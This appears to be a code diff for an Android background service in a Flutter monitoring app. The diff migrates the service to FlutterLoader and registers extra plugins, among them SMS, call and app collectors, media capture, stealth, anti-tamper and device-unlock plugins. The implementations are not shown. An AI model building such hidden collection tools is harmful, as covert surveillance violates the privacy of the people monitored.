@@ -9,8 +9,8 @@ import androidx.core.app.NotificationCompat
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.embedding.engine.dart.DartExecutor
 import io.flutter.plugin.common.MethodChannel
+import io.flutter.embedding.engine.loader.FlutterLoader
 import io.flutter.view.FlutterCallbackInformation
-import io.flutter.view.FlutterMain
 import java.util.concurrent.atomic.AtomicBoolean
 
 class BackgroundCollectorService : Service() {
@@ -104,8 +104,9 @@ class BackgroundCollectorService : Service() {
         
         serviceRunning.set(true)
         
-        FlutterMain.startInitialization(this)
-        FlutterMain.ensureInitializationComplete(this, null)
+        val flutterLoader = FlutterLoader()
+        flutterLoader.startInitialization(this)
+        flutterLoader.ensureInitializationComplete(this, null)
         
         val sharedPreferences = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
         val callbackHandle = sharedPreferences.getLong(CALLBACK_HANDLE_KEY, 0)
@@ -123,13 +124,26 @@ class BackgroundCollectorService : Service() {
         
         flutterEngine = FlutterEngine(this)
         
-        // Register plugins
+        // Register plugins.
+        // Keep this in sync with MainActivity: this service owns a separate
+        // FlutterEngine and does not inherit plugins from the activity engine.
         flutterEngine?.plugins?.add(SmsCollectorPlugin())
         flutterEngine?.plugins?.add(CallsCollectorPlugin())
         flutterEngine?.plugins?.add(AppsCollectorPlugin())
+        flutterEngine?.plugins?.add(MediaCapturePlugin())
+        flutterEngine?.plugins?.add(BatteryMonitorPlugin())
         flutterEngine?.plugins?.add(UnlockDevicePlugin())
+        flutterEngine?.plugins?.add(MediaStoreScannerPlugin())
+        flutterEngine?.plugins?.add(BatteryOptimizationPlugin())
+        flutterEngine?.plugins?.add(SecurityPlugin())
+        flutterEngine?.plugins?.add(KeystorePlugin())
+        flutterEngine?.plugins?.add(PerformancePlugin())
+        flutterEngine?.plugins?.add(PermissionsPlugin())
+        flutterEngine?.plugins?.add(StealthPlugin())
+        flutterEngine?.plugins?.add(AntiTamperPlugin())
         
-        methodChannel = MethodChannel(flutterEngine?.dartExecutor?.binaryMessenger, "com.xpsafeconnect.monitored_app/background")
+        val binaryMessenger = flutterEngine?.dartExecutor?.binaryMessenger ?: return
+        methodChannel = MethodChannel(binaryMessenger, "com.xpsafeconnect.monitored_app/background")
         
         // Ajout du gestionnaire de méthodes pour MethodChannel
         methodChannel?.setMethodCallHandler { call, result ->
@@ -170,7 +184,7 @@ class BackgroundCollectorService : Service() {
         flutterEngine?.dartExecutor?.executeDartCallback(
             DartExecutor.DartCallback(
                 assets,
-                FlutterMain.findAppBundlePath(),
+                flutterLoader.findAppBundlePath(),
                 callbackInfo
             )
         )
@@ -229,7 +243,7 @@ class BackgroundCollectorService : Service() {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle(title)
             .setContentText(text)
-            .setSmallIcon(R.drawable.ic_notification)
+            .setSmallIcon(R.mipmap.ic_launcher)
             .setContentIntent(pendingIntent)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
